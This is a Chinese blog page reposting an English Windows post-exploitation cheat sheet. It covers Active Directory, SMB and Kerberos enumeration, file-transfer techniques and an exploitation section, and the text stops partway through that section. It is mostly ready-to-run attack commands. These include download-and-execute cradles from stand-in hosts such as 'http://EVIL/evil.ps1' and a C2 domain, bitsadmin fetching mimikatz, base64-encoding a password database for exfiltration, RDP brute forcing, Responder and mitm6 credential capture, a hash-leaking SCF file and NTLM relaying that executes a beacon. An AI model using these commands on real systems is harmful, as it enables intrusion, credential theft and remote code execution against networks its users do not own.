<!DOCTYPE html>
<html lang="zh-CN">










<head>
    <meta charset="utf-8" />
    <link rel="apple-touch-icon" sizes="76x76" href="/favicon.ico">
    <link rel="icon" type="image/png" href="/favicon.ico">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0, shrink-to-fit=no" name="viewport" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="description" content="One way to choose one">
    <meta name="author" content="Misaki">
    <meta name="keywords" content="">
    <title>Windows Notes ~ Misaki&#39;s Blog</title>
    
<link rel="stylesheet" href="/css/Material_Icons.css">

    <!-- 
<link rel="stylesheet" href="/css/font-awesome.css">
 -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css">
    
<link rel="stylesheet" href="/css/main.css">

    
        
<link rel="stylesheet" href="/css/post.css">

        
            
<link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">

        
    
<meta name="generator" content="Hexo 5.4.2"></head>

<body class=" sidebar-collapse">
<nav class="navbar navbar-transparent navbar-color-on-scroll fixed-top navbar-expand-lg" color-on-scroll="100" id="sectionsNav">
    <div class="container">
        <div class="navbar-translate">
            <a class="navbar-brand" href="/">
                Misaki&#39;s Blog</a>
            <button class="navbar-toggler" type="button" data-toggle="collapse" aria-expanded="false" aria-label="Toggle navigation">
                <span class="sr-only">Toggle navigation</span>
                <span class="navbar-toggler-icon"></span>
                <span class="navbar-toggler-icon"></span>
                <span class="navbar-toggler-icon"></span>
            </button>
        </div>
            <div class="collapse navbar-collapse">
                <ul class="navbar-nav ml-auto">
                    
                        
                            <li class="nav-item">
                                <a class="nav-link" href="/archives/">
                                    archives
                                </a>
                            </li>
                        
                            <li class="nav-item">
                                <a class="nav-link" href="/about/">
                                    about
                                </a>
                            </li>
                        
                    
                    
                        
                            <li class="nav-item">
                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://github.com/MisakiKata" target="_blank" data-original-title="See me here">
                                    <i class="fa fa-github"></i>
                                </a>
                            </li>
                        
                            <li class="nav-item">
                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://www.t00ls.net/members-profile-12179.html" target="_blank" data-original-title="See me here">
                                    <i class="fa fa-twitch"></i>
                                </a>
                            </li>
                        
                            <li class="nav-item">
                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://misakikata.github.io/atom.xml" target="_blank" data-original-title="See me here">
                                    <i class="fa fa-rss"></i>
                                </a>
                            </li>
                        
                            <li class="nav-item">
                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="mailto:misakikatas@gmail.com" target="_blank" data-original-title="See me here">
                                    <i class="fa fa-envelope"></i>
                                </a>
                            </li>
                        
                            <li class="nav-item">
                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/img/2022/12/29/10-47-19-8d33d040e42d9f086a13827162cc246a-下载-17fdcb.png" target="_blank" data-original-title="See me here">
                                    <i class="fa fa-comments"></i>
                                </a>
                            </li>
                        
                    
                </ul>
            </div>
    </div>
</nav>
    
  <div class="page-header header-filter" data-parallax="true" style="background-image: url('/img/post-banner.jpg'); height: 70vh;">
    
      <div class="container">
        <h1 class="title text-center post_title">Windows Notes</h1>
        <p class="text-center"><b>Friday, October 11th 2019, 10:11 am</b></p>
      </div>
    
  </div>

  
  
  
    <div class="row" style="margin: 0 0 0; z-index: 999;">
  <div class="col-md-8 offset-md-1">
    <div class="main main-raised">
      <div class="container">
        <div class="section">
          <div class="post_content">
              <p>文章是对windows后渗透的利用，提权和持久化等做的详细利用方式。</p>
<p>原文搬运：<a target="_blank" rel="noopener" href="https://m0chan.github.io/2019/07/30/Windows-Notes-and-Cheatsheet.html">https://m0chan.github.io/2019/07/30/Windows-Notes-and-Cheatsheet.html</a></p>
<h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><h2 id="Basics"><a href="#Basics" class="headerlink" title="Basics"></a>Basics</h2><pre class="line-numbers language-none"><code class="language-none">net users
net users &#x2F;domain
net localgroup
net groups &#x2F;domain
net groups &#x2F;domain &quot;Domain Admins&quot;

Get-ADUser
Get-Domain
Get-DomainUser
Get-DomainGroup
Get-DomainGroupMember -identity &quot;Domain Admins&quot; -Domain m0chanAD.local -DomainController 10.10.14.10
Find-DomainShare


#Host Discovery
netdiscover -r subnet&#x2F;24
nbtscan -r [range]
for &#x2F;L %i in (1,1,255) do  @ping.exe -n 1 -w 50 &lt;10.10.10&gt;.%i | findstr TTL


#Reverse DNS Lookup
$ComputerIPAddress &#x3D; &quot;10.10.14.14&quot;
[System.Net.Dns]::GetHostEntry($ComputerIPAddress).HostName<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><a target="_blank" rel="noopener" href="https://github.com/tevora-threat/SharpView">https://github.com/tevora-threat/SharpView</a></p>
<h4 id="Users-with-SPN"><a href="#Users-with-SPN" class="headerlink" title="Users with SPN"></a>Users with SPN</h4><pre class="line-numbers language-none"><code class="language-none">Get-DomainUser -SPN

Get-ADComputer -filter &#123;ServicePrincipalName -like &lt;keyword&gt;&#125; -Properties OperatingSystem,OperatingSystemVersion,OperatingSystemServicePack,
PasswordLastSet,LastLogonDate,ServicePrincipalName,TrustedForDelegation,TrustedtoAuthForDelegation<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Kerberos-Enumeration"><a href="#Kerberos-Enumeration" class="headerlink" title="Kerberos Enumeration"></a>Kerberos Enumeration</h4><pre class="line-numbers language-none"><code class="language-none">nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm&#x3D;&#39;test&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="Red-Team-CSharp-Scripts"><a href="#Red-Team-CSharp-Scripts" class="headerlink" title="Red-Team CSharp Scripts"></a>Red-Team CSharp Scripts</h4><pre class="line-numbers language-none"><code class="language-none">#https:&#x2F;&#x2F;github.com&#x2F;Mr-Un1k0d3r&#x2F;RedTeamCSharpScripts

LDAPUtility.cs

Usage: ldaputility.exe options domain [arguments]

ldaputility.exe DumpAllUsers m0chan
ldaputility.exe DumpUser m0chan mr.un1k0d3r
ldaputility.exe DumpUsersEmail m0chan
ldaputility.exe DumpAllComputers m0chan 
ldaputility.exe DumpComputer m0chan DC01
ldaputility.exe DumpAllGroups m0chan
ldaputility.exe DumpGroup m0chan &quot;Domain Admins&quot;
ldaputility.exe DumpPasswordPolicy m0chan

Also WMIUtility.cs for WMI Calls &amp; LDAPQuery.cs for Raw LDAP Queries.

See github linked above for full details.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Active-Directory"><a href="#Active-Directory" class="headerlink" title="Active Directory"></a>Active Directory</h4><pre class="line-numbers language-none"><code class="language-none">nltest &#x2F;DCLIST:DomainName
nltest &#x2F;DCNAME:DomainName
nltest &#x2F;DSGETDC:DomainName

# Get Current Domain Info - Similar to Get-Domain
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# Get Domain Trust Info - Similar to Get-DomainTrust
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

# View Domain Info
[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()

#  View Domain Trust Information
([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(&#39;Forest&#39;, &#39;forest-of-interest.local&#39;)))).GetAllTrustRelationships()

nltest [server:&lt;fqdn_foreign_domain&gt;] &#x2F;domain_trusts &#x2F;all_trusts &#x2F;v

nltest &#x2F;dsgetfti:&lt;domain&gt;

nltest &#x2F;server:&lt;ip_dc&gt; &#x2F;domain_trusts &#x2F;all_trusts

([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

# View All Domain Controllers
nltest &#x2F;dclist:offense.local
net group &quot;domain controllers&quot; &#x2F;domain

# View DC for Current Session
nltest &#x2F;dsgetdc:m0chanAD.local

# View Domain Trusts from CMD
nltest &#x2F;domain_trusts

# View User Info from CMD
nltest &#x2F;user:&quot;m0chan&quot;

# get domain name and DC the user authenticated to
klist

# Get All Logged on Sessions, Includes NTLM &amp; Kerberos
klist sessions

# View Kerb Tickets
klist

# View Cached Krbtgt
klist tgt

# whoami on older Windows systems
set u

#List all Usernames
([adsisearcher]&quot;(&amp;(objectClass&#x3D;User)(samaccountname&#x3D;*))&quot;).FindAll().Properties.samaccountname

#List Administrators

([adsisearcher]&quot;(&amp;(objectClass&#x3D;User)(admincount&#x3D;1))&quot;).FindAll().Properties.samaccountname

#List all Info about Specific User

([adsisearcher]&quot;(&amp;(objectClass&#x3D;User)(samaccountname&#x3D;&lt;username&gt;))&quot;).FindAll().Properties

#View All Users with Description Field Set

([adsisearcher]&quot;(&amp;(objectClass&#x3D;group)(samaccountname&#x3D;*))&quot;).FindAll().Properties | % &#123; Write-Host $_.samaccountname : $_.description &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="AD-Enumeration-from-Linux-Box-AD-Tool"><a href="#AD-Enumeration-from-Linux-Box-AD-Tool" class="headerlink" title="AD Enumeration from Linux Box - AD Tool"></a>AD Enumeration from Linux Box - AD Tool</h4><pre class="line-numbers language-none"><code class="language-none">#https:&#x2F;&#x2F;github.com&#x2F;jasonwbarnett&#x2F;linux-adtool

tar zxvf adtools-1.x.tar.gz
cd adtools-1.x
.&#x2F;configure
make
make install

&gt; adtool list ou&#x3D;user,dc&#x3D;example,dc&#x3D;com
CN&#x3D;allusers,OU&#x3D;user,DC&#x3D;example,DC&#x3D;com
OU&#x3D;finance,OU&#x3D;user,DC&#x3D;example,DC&#x3D;com
OU&#x3D;administration,OU&#x3D;user,DC&#x3D;example,DC&#x3D;com

&gt; adtool oucreate marketing ou&#x3D;user,dc&#x3D;example,dc&#x3D;com
&gt; adtool useradd jsmith ou&#x3D;marketing,ou&#x3D;user,dc&#x3D;example,dc&#x3D;com
&gt; adtool setpass jsmith banana
&gt; adtool unlock jsmith
&gt; adtool groupadd allusers jsmith
&gt; adtool attributereplace jsmith telephonenumber 123
&gt; adtool attributereplace jsmith mail jsmith@example.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="SharpView-Enumeration"><a href="#SharpView-Enumeration" class="headerlink" title="SharpView Enumeration"></a>SharpView Enumeration</h4><pre class="line-numbers language-none"><code class="language-none">#https:&#x2F;&#x2F;github.com&#x2F;tevora-threat&#x2F;SharpView

Get-DomainFileServer
Get-DomainGPOUserLocalGroupMapping
Find-GPOLocation
Get-DomainGPOComputerLocalGroupMapping
Find-GPOComputerAdmin
Get-DomainObjectAcl
Get-ObjectAcl
Add-DomainObjectAcl
Add-ObjectAcl
Remove-DomainObjectAcl
Get-RegLoggedOn
Get-LoggedOnLocal
Get-NetRDPSession
Test-AdminAccess
Invoke-CheckLocalAdminAccess
Get-WMIProcess
Get-NetProcess
Get-WMIRegProxy
Get-Proxy
Get-WMIRegLastLoggedOn
Get-LastLoggedOn
Get-WMIRegCachedRDPConnection
Get-CachedRDPConnection
Get-WMIRegMountedDrive
Get-RegistryMountedDrive
Find-InterestingDomainAcl
Invoke-ACLScanner
Get-NetShare
Get-NetLoggedon<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="SMB-Enumeration"><a href="#SMB-Enumeration" class="headerlink" title="SMB Enumeration"></a>SMB Enumeration</h4><pre class="line-numbers language-none"><code class="language-none">nmap -p 139,445 --script smb.nse,smb-enum-shares,smbls
enum4linux 1.3.3.7
smbmap -H 1.3.3.7
smbclient -L \\INSERTIPADDRESS
smbclient -L INSERTIPADDRESS
smbclient &#x2F;&#x2F;INSERTIPADDRESS&#x2F;tmp
smbclient \\\\INSERTIPADDRESS\\ipc$ -U john
smbclient &#x2F;&#x2F;INSERTIPADDRESS&#x2F;ipc$ -U john
smbclient &#x2F;&#x2F;INSERTIPADDRESS&#x2F;admin$ -U john
nbtscan [SUBNET]


#Check for SMB Signing
nmap --script smb-security-mode.nse -p 445 10.10.14.14 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="SNMP-Enumeration"><a href="#SNMP-Enumeration" class="headerlink" title="SNMP Enumeration"></a>SNMP Enumeration</h4><pre class="line-numbers language-none"><code class="language-none">snmpwalk -c public -v1 10.10.14.14
snmpcheck -t 10.10.14.14 -c public
onesixtyone -c names -i hosts
nmap -sT -p 161 10.10.14.14 -oG snmp_results.txt
snmpenum -t 10.10.14.14<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="MySQL-Enumeration"><a href="#MySQL-Enumeration" class="headerlink" title="MySQL Enumeration"></a>MySQL Enumeration</h4><pre class="line-numbers language-none"><code class="language-none">nmap -sV -Pn -vv  10.0.0.1 -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="DNS-Zone-Transfer"><a href="#DNS-Zone-Transfer" class="headerlink" title="DNS Zone Transfer"></a>DNS Zone Transfer</h4><pre class="line-numbers language-none"><code class="language-none">dig axfr blah.com @ns1.m0chan.com
nslookup -&gt; set type&#x3D;any -&gt; ls -d m0chan.com
dnsrecon -d m0chan -D &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dnsmap.txt -t std --xml ouput.xml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h4 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h4><pre class="line-numbers language-none"><code class="language-none">ldapsearch -H ldap:&#x2F;&#x2F;&lt;ip&gt;
ldapwhoami<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h4 id="RPC-Enumeration"><a href="#RPC-Enumeration" class="headerlink" title="RPC Enumeration"></a>RPC Enumeration</h4><pre class="line-numbers language-none"><code class="language-none">rpcclient -U &quot;10.10.14.14&quot;
srvinfo
enumdomusers
enumalsgroups domain
lookupnames administrators
querydominfo
enumdomusers
queryuser &lt;user&gt;
lsaquery
lookupnames Guest
lookupnames Administrator<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Remote-Desktop"><a href="#Remote-Desktop" class="headerlink" title="Remote Desktop"></a>Remote Desktop</h4><pre class="line-numbers language-none"><code class="language-none">rdesktop -u guest -p guest INSERTIPADDRESS -g 94%

# Brute force
ncrack -vv --user Administrator -P &#x2F;root&#x2F;oscp&#x2F;passwords.txt rdp:&#x2F;&#x2F;INSERTIPADDRESS<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="File-Transfer"><a href="#File-Transfer" class="headerlink" title="File Transfer"></a>File Transfer</h2><h4 id="TFTP"><a href="#TFTP" class="headerlink" title="TFTP"></a>TFTP</h4><pre class="line-numbers language-none"><code class="language-none">m0chan Machine
mkdir tftp
atftpd --deamon --port 69 tftp
cp *file* tftp
On victim machine:
tftp -i &lt;[IP]&gt; GET &lt;[FILE]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h4><pre class="line-numbers language-none"><code class="language-none">echo open &lt;[IP]&gt; 21 &gt; ftp.txt
echo USER demo &gt;&gt; ftp.txt
echo ftp &gt;&gt; ftp.txt
echo bin &gt;&gt; ftp.txt
echo GET nc.exe &gt;&gt; ftp.txt
echo bye &gt;&gt; ftp.txt
ftp -v -n -s:ftp.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="VBS-Script"><a href="#VBS-Script" class="headerlink" title="VBS Script"></a>VBS Script</h4><pre class="line-numbers language-none"><code class="language-none">echo strUrl &#x3D; WScript.Arguments.Item(0) &gt; wget.vbs
echo StrFile &#x3D; WScript.Arguments.Item(1) &gt;&gt; wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT &#x3D; 0 &gt;&gt; wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG &#x3D; 0 &gt;&gt; wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT &#x3D; 1 &gt;&gt; wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY &#x3D; 2 &gt;&gt; wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts &gt;&gt; wget.vbs
echo Err.Clear &gt;&gt; wget.vbs
echo Set http &#x3D; Nothing &gt;&gt; wget.vbs
echo Set http &#x3D; CreateObject(&quot;WinHttp.WinHttpRequest.5.1&quot;) &gt;&gt; wget.vbs
echo If http Is Nothing Then Set http &#x3D; CreateObject(&quot;WinHttp.WinHttpRequest&quot;) &gt;&gt; wget.vbs
echo If http Is Nothing Then Set http &#x3D; CreateObject(&quot;MSXML2.ServerXMLHTTP&quot;) &gt;&gt; wget.vbs
echo If http Is Nothing Then Set http &#x3D; CreateObject(&quot;Microsoft.XMLHTTP&quot;) &gt;&gt; wget.vbs
echo http.Open &quot;GET&quot;,strURL,False &gt;&gt; wget.vbs
echo http.Send &gt;&gt; wget.vbs
echo varByteArray &#x3D; http.ResponseBody &gt;&gt; wget.vbs
echo Set http &#x3D; Nothing &gt;&gt; wget.vbs
echo Set fs &#x3D; CreateObject(&quot;Scripting.FileSystemObject&quot;) &gt;&gt; wget.vbs
echo Set ts &#x3D; fs.CreateTextFile(StrFile,True) &gt;&gt; wget.vbs
echo strData &#x3D; &quot;&quot; &gt;&gt; wget.vbs
echo strBuffer &#x3D; &quot;&quot; &gt;&gt; wget.vbs
echo For lngCounter &#x3D; 0 to UBound(varByteArray) &gt;&gt; wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) &gt;&gt; wget.vbs
echo Next &gt;&gt; wget.vbs
echo ts.Close &gt;&gt; wget.vbs



cscript wget.vbs &lt;url&gt; &lt;out_file&gt;

Use echoup function on pentest.ws to generate echo commands.
https:&#x2F;&#x2F;pentest.ws&#x2F;features<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h4><pre class="line-numbers language-none"><code class="language-none">#https:&#x2F;&#x2F;github.com&#x2F;danielbohannon&#x2F;Invoke-CradleCrafter Use this to craft obsufacted cradles

Invoke-WebRequest &quot;https:&#x2F;&#x2F;server&#x2F;filename&quot; -OutFile &quot;C:\Windows\Temp\filename&quot;

(New-Object System.Net.WebClient).DownloadFile(&quot;https:&#x2F;&#x2F;server&#x2F;filename&quot;, &quot;C:\Windows\Temp\filename&quot;) 

#Powershell Download to Memory

IEX(New-Object Net.WebClient).downloadString(&#39;http:&#x2F;&#x2F;server&#x2F;script.ps1&#39;)

#Powershell with Proxy

$browser &#x3D; New-Object System.Net.WebClient;
$browser.Proxy.Credentials &#x3D; [System.Net.CredentialCache]::DefaultNetworkCredentials;
IEX($browser.DownloadString(&#39;https:&#x2F;&#x2F;server&#x2F;script.ps1&#39;));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Powershell-Base64"><a href="#Powershell-Base64" class="headerlink" title="Powershell Base64"></a>Powershell Base64</h4><pre class="line-numbers language-none"><code class="language-none">$fileName &#x3D; &quot;Passwords.kdbx&quot;
$fileContent &#x3D; get-content $fileName
$fileContentBytes &#x3D; [System.Text.Encoding]::UTF8.GetBytes($fileContent)
$fileContentEncoded &#x3D; [System.Convert]::ToBase64String($fileContentBytes)
$fileContentEncoded | set-content ($fileName + &quot;.b64&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Secure-Copy-pscp-exe"><a href="#Secure-Copy-pscp-exe" class="headerlink" title="Secure Copy / pscp.exe"></a>Secure Copy / pscp.exe</h4><pre class="line-numbers language-none"><code class="language-none">pscp.exe C:\Users\Public\m0chan.txt user@target:&#x2F;tmp&#x2F;m0chan.txt
pscp.exe user@target:&#x2F;home&#x2F;user&#x2F;m0chan.txt C:\Users\Public\m0chan.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h4 id="BitsAdmin-exe"><a href="#BitsAdmin-exe" class="headerlink" title="BitsAdmin.exe"></a>BitsAdmin.exe</h4><pre class="line-numbers language-none"><code class="language-none">cmd.exe &#x2F;c &quot;bitsadmin.exe &#x2F;transfer downld_job &#x2F;download &#x2F;priority high http:&#x2F;&#x2F;c2.m0chan.com C:\Temp\mimikatz.exe &amp; start C:\Temp\binary.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="Remote-Desktop-1"><a href="#Remote-Desktop-1" class="headerlink" title="Remote Desktop"></a>Remote Desktop</h4><pre class="line-numbers language-none"><code class="language-none">rdesktop 10.10.10.10 -r disk:linux&#x3D;&#39;&#x2F;home&#x2F;user&#x2F;filetransferout&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="WinHTTP-Com-Object"><a href="#WinHTTP-Com-Object" class="headerlink" title="WinHTTP Com Object"></a>WinHTTP Com Object</h4><pre class="line-numbers language-none"><code class="language-none">[System.Net.WebRequest]::DefaultWebProxy
[System.Net.CredentialCache]::DefaultNetworkCredentials
$h&#x3D;new-object -com WinHttp.WinHttpRequest.5.1;$h.open(&#39;GET&#39;,&#39;http:&#x2F;&#x2F;EVIL&#x2F;evil.ps1&#39;,$false);$h.send();iex $h.responseText<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h4 id="CertUtil"><a href="#CertUtil" class="headerlink" title="CertUtil"></a>CertUtil</h4><pre class="line-numbers language-none"><code class="language-none">#File Transfer

certutil.exe -urlcache -split -f https:&#x2F;&#x2F;m0chan:8888&#x2F;filename outputfilename

#CertUtil Base64 Transfers

certutil.exe -encode inputFileName encodedOutputFileName
certutil.exe -decode encodedInputFileName decodedOutputFileName<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Curl-Windows-1803"><a href="#Curl-Windows-1803" class="headerlink" title="Curl (Windows 1803+)"></a>Curl (Windows 1803+)</h4><pre class="line-numbers language-none"><code class="language-none">curl http:&#x2F;&#x2F;server&#x2F;file -o file
curl http:&#x2F;&#x2F;server&#x2F;file.bat | cmd

IEX(curl http:&#x2F;&#x2F;server&#x2F;script.ps1);Invoke-Blah<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h4><pre class="line-numbers language-none"><code class="language-none">python smbserver.py Share &#96;pwd&#96; -u m0chan -p m0chan --smb-2support<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h4 id="LLMNR-NBT-NS-Spoofing"><a href="#LLMNR-NBT-NS-Spoofing" class="headerlink" title="LLMNR / NBT-NS Spoofing"></a>LLMNR / NBT-NS Spoofing</h4><pre class="line-numbers language-none"><code class="language-none">#Responder to Steal Creds

git clone https:&#x2F;&#x2F;github.com&#x2F;SpiderLabs&#x2F;Responder.git python Responder.py -i local-ip -I eth0


LLMNR and NBT-NS is usually on by default and there purpose is to act as a fallback to DNS. i&#x2F;e if you search \\HRServer\ but it dosent exist, Windows (by default) will send out a LLMNR broadcast across the network. By using Responder we can respond to these broadcasts and say something like

&#39;Yeah I&#39;m HRServer, authenticate to me and I will get a NTLMv2 hash which I can crack or relay. More on relaying below&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Responder-WPAD-Attack"><a href="#Responder-WPAD-Attack" class="headerlink" title="Responder WPAD Attack"></a>Responder WPAD Attack</h4><pre class="line-numbers language-none"><code class="language-none">responder -I eth0 wpad

By default, Windows is configured to search for a Web Proxy Auto-Discovery file when using the internet

Go to internet explorer and search for Google which automatically searches for a WPAD file... 

Then take NTLMv2 hash and NTLM Relay it or send to cracking rig. <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="mitm6"><a href="#mitm6" class="headerlink" title="mitm6"></a>mitm6</h4><pre class="line-numbers language-none"><code class="language-none">#Use when WPAD attack is not working, this uses IPv6 and DNS to relay creds to a target. 

By default IPV6 should be enabled. 
git clone https:&#x2F;&#x2F;github.com&#x2F;fox-it&#x2F;mitm6.git 
cd &#x2F;opt&#x2F;tools&#x2F;mitm6
pip install .

mitm6 -d m0chanAD.local

Now the vuln occurs, Windows prefers IPV6 over IPv4 meaning DNS &#x3D; controlled by attacker. 

ntlmrelayx.py -wh webserverhostingwpad:80 -t smb:&#x2F;&#x2F;TARGETIP&#x2F; -i

-i opens an interactive shell.

Shout out to hausec for this super nice tip.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="SCF-File-Attack"><a href="#SCF-File-Attack" class="headerlink" title="SCF File Attack"></a>SCF File Attack</h4><pre class="line-numbers language-none"><code class="language-none">Create .scf file and drop inside SMB Share and fire up Responder ;) 


Filename &#x3D; @m0chan.scf

[Shell]
Command&#x3D;2
IconFile&#x3D;\\10.10.14.2\Share\test.ico
[Taskbar]
Command&#x3D;ToggleDesktop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="NTLM-Relay"><a href="#NTLM-Relay" class="headerlink" title="NTLM-Relay"></a>NTLM-Relay</h4><pre class="line-numbers language-none"><code class="language-none">Good article explaining differences between NTLM&#x2F;Net-NTLMV1&amp;V2

https:&#x2F;&#x2F;byt3bl33d3r.github.io&#x2F;practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html

TL;DR NTLMv1&#x2F;v2 is a shorthand for Net-NTLMv1&#x2F;v2 and hence are the same thing.

You CAN perform Pass-The-Hash attacks with NTLM hashes.
You CANNOT perform Pass-The-Hash attacks with Net-NTLM hashes.

PS: You CANNOT relay a hash back to itself.
PS: SMB Signing must be disabled to mitigate this, you can check with nmap scan or crackmapexec

crackmapexec smb 10.10.14.0&#x2F;24 --gene-relay-list targets.txt

This will tell you a list of hosts within a subnet which do not have SMB Signing enabled.

python Responder.py -I &lt;interface&gt; -r -d -w
ntlmrelayx.py -tf targets.txt (By default this will dump the local SAM of the targets, not very useful?)

How about we execute a command instead.

ntlmrelayx.py -tf targets.txt -c powershell.exe -Enc asdasdasdasd
ntlmrelayx.py -tf targets.txt -c powershell.exe &#x2F;c download and execute beacon... &#x3D; RIP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Priv-Exchange"><a href="#Priv-Exchange" class="headerlink" title="Priv Exchange"></a>Priv Exchange</h4><pre class="line-numbers language-none"><code class="language-none">#https:&#x2F;&#x2F;dirkjanm.io&#x2F;abusing-exchange-one-api-call-away-from-domain-admin&#x2F;

Combine privxchange.py and ntlmrelayx

